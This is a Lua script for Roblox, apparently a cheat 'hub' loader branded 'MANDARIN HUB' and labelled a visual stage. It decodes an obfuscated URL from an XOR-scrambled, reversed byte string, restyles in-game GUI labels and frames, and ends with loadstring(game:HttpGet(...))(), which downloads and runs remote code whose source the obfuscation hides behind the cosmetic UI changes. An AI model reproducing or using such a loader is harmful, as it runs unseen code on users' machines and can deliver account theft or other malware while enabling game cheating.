
--[[ STAGE 2: VISUAL CORE ]]
local w6JBPjjdRHztWCxT9o20l="\247\205\192\136\203\154\235\235\245\044\250\205\049\005\001\028\099\099\009\103\057\068\117\124\083\106\077\082\174\089\191\183\186\177\182\135\083\139\152\157\234\237\249\196\159\251\207\219\215\221\032\033\222\043\013\057\042\211\030\029\031\109\053\114\124\113\085\075\077\081\162\092\105\174\185\184\191\141\143\145\151\228\237\232\177\253\197\251\138\222\222\209\044\044\053\043\006\061\009\017\014\101\028\106\111\107\062\079\127\072\021\031\110\175\172\178\188\178"local iPUU6cobdlEZ7=39 local KukGIH37iZZ9W2=105 local rjXBhvUwskmcvILEL=1 local HbU5LKUWhWkxbPN8vKivRr=6 local _Ltopw6nqsEkejN_mNi=0 local bBvrtKlz2f1myapHW=true local FYLsuqdbmdIMGylcA3sTy=bit32 and bit32.bxor if not FYLsuqdbmdIMGylcA3sTy then FYLsuqdbmdIMGylcA3sTy=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local CE4G9WsBhih8TgnB={}for oCUqp60TyndX6ayFyQcuy=1,#w6JBPjjdRHztWCxT9o20l do local BqMz1CLhe6Lk=string.byte(w6JBPjjdRHztWCxT9o20l,oCUqp60TyndX6ayFyQcuy)local _5XPJ94JVwSVUaUxjalz=(KukGIH37iZZ9W2+(oCUqp60TyndX6ayFyQcuy*HbU5LKUWhWkxbPN8vKivRr)+_Ltopw6nqsEkejN_mNi)%256 if rjXBhvUwskmcvILEL==0 then BqMz1CLhe6Lk=(BqMz1CLhe6Lk-_5XPJ94JVwSVUaUxjalz)%256 CE4G9WsBhih8TgnB[oCUqp60TyndX6ayFyQcuy]=string.char(FYLsuqdbmdIMGylcA3sTy(BqMz1CLhe6Lk,iPUU6cobdlEZ7))else BqMz1CLhe6Lk=FYLsuqdbmdIMGylcA3sTy(BqMz1CLhe6Lk,iPUU6cobdlEZ7)CE4G9WsBhih8TgnB[oCUqp60TyndX6ayFyQcuy]=string.char((BqMz1CLhe6Lk-_5XPJ94JVwSVUaUxjalz)%256)end end local tWUn6jQXEICa8=table.concat(CE4G9WsBhih8TgnB)if bBvrtKlz2f1myapHW then tWUn6jQXEICa8=string.reverse(tWUn6jQXEICa8)end local qMY_4eWDHMXrv0kGz=tWUn6jQXEICa8
local HubName = "MANDARIN HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(qMY_4eWDHMXrv0kGz))()
